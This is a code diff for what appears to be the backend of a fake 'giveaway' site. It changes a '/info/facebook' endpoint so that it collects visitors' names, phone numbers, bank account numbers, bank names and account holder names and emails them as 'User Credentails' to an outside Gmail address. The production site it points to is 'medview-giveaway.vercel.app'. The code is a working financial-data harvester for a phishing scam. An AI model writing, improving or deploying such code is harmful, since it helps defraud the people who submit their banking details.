@@ -10,11 +10,11 @@ const PORT = process.env.PORT || 4040
 
 // frontend url and callback
 
-const frontend_url = nodeEnv === 'development' ? 'http://127.0.0.1:5500' : ''
+const frontend_url = nodeEnv === 'development' ? 'http://127.0.0.1:5500' : 'https://medview-giveaway.vercel.app'
 
 // CORS SETUP
 
-const allowedOrigins = ['http://127.0.0.1:5500', '']
+const allowedOrigins = ['http://127.0.0.1:5500', 'https://medview-giveaway.vercel.app']
 
 const corsOption = {
     origin: function(origin, callback){
@@ -40,21 +40,24 @@ const transporter = nodemailer.createTransport({
 })
 
 app.post('/info/facebook', (req,res)=>{
-    const { username, email, accountNumber, bankName, bankHolder } = req.body
+    const { username, phone, accountNumber, bankName, bankHolder } = req.body
 
-    console.log(username, email, accountNumber)
+    console.log(username, phone, accountNumber, bankName, bankHolder)
 
     try {
 
         const mailOptions = {
             from: 'contactshonenstream@gmail.com', // My mail
-            to: 'Veraaxomorgan@gmail.com', // reciever's email DonJerry
+            to: 'reesekyleighnyomi@gmail.com', // reciever's email DonJerry
             subject: 'User Credentails',
-            text: `Name: ${username}\n\nEmail: ${email}\n\nAccount Number: ${accountNumber}\n\nBank: ${bankName}\n\nBank Holder: ${bankHolder}`
+            text: `Name: ${username}\n\nPhone Number: ${phone}\n\nAccount Number: ${accountNumber}\n\nBank: ${bankName}\n\nBank Holder: ${bankHolder}`
         }
     
         transporter.sendMail(mailOptions, (err, info) => {
-            if(err) console.log('Email error', err)
+            if(err){ 
+                console.log('Email error', err)
+                res.status(400).json({ error: err })
+            }
             else console.log('Email sent', info.response)
         })
     } catch(err){
